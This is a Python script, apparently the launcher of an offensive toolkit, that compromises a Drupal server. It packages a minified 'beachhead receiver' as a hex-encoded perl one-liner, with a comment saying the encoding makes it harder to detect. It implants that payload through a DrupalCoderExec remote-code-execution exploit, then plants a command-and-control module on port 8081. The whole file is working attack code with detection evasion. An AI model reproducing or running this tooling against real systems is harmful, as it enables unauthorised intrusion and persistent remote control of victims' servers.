import binascii
import pathlib
import time

import python_minifier

from include.BeachheadSender import BeachheadSender
from include.DrupalCoderExec import DrupalCoderExec

PARENT_DIR = str(pathlib.Path(__file__).parent.absolute()) + "/"
BEACHHEAD_LOCATION = PARENT_DIR + "include/BeachheadReceiver.py"


def package_beachhead():
    """Packages the beachhead receiver into a shell command

    This function will read the beachhead receiver from its file, minify it,
    put it in a format that will let it be piped directly into a python3 
    interpreter, and then package it into a perl command that can be implanted
    by the DrupalCoderExec exploit.
    """

    with open(BEACHHEAD_LOCATION, "r") as f:
        # The minifier will remove all comments and whitespace from 
        # the file, as well as make other optimizations
        receiver = python_minifier.minify(f.read())

    # Echoing the receiver into a python interpreter will run it 
    # in memory and not write unnecessary files to disk
    receiver = 'echo "' + receiver + '" | python3'

    # Covert the receiver to hex to make it harder to detect and less likely 
    # to run into issues with special characters
    hex_beachhead = binascii.hexlify(receiver.encode("utf-8")).decode("utf-8")

    # Use the perl pack function to convert the hex back into a 
    # string and run it as a shell command
    bh = (
        "perl -e 'system(pack(qq,H"
        + str(len(hex_beachhead))
        + ",,qq,"
        + hex_beachhead
        + ",))'"
    )

    print("BEACHHEAD: beachhead packaged")
    return bh


def implant_beachhead(ip_addr, port, path):
    """Implants the beachhead receiver into the target machine

    This function will use the DrupalCoderExec class to implant the beachhead 
    receiver into the target machine.

    See that class for further documentation.
    """

    beachhead = package_beachhead()
    exec = DrupalCoderExec(beachhead)
    exec.exploit(ip_addr, port, path)

    print("BEACHHEAD: Beachhead implanted")
    return


def implant_cnc(ip_addr, port, path, implant_file_path):
    """Implants the Command and Control module receiver into the target machine

    This function will use the BeachheadSender class to implant the 
    Command and Control module receiver into the target machine.

    See that class for further documentation.
    """

    sender = BeachheadSender(ip_addr, port, path, implant_file_path)
    sender.send_request()

    print("BEACHHEAD: CNC implanted")
    return


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()

    parser.add_argument("--ip", required=True, help="IP address of the target machine")
    parser.add_argument("--port", required=True, help="Port of the Drupal server")
    parser.add_argument("--path", required=True, help="Path to the Drupal server")
    parser.add_argument("--implant", required=True, help="Path to the implant file")
    args = parser.parse_args()

    implant_beachhead(args.ip, args.port, args.path)

    # Wait for the beachhead to be implanted before implanting the CNC
    time.sleep(5)

    implant_cnc(args.ip, "8081", args.path, args.implant)
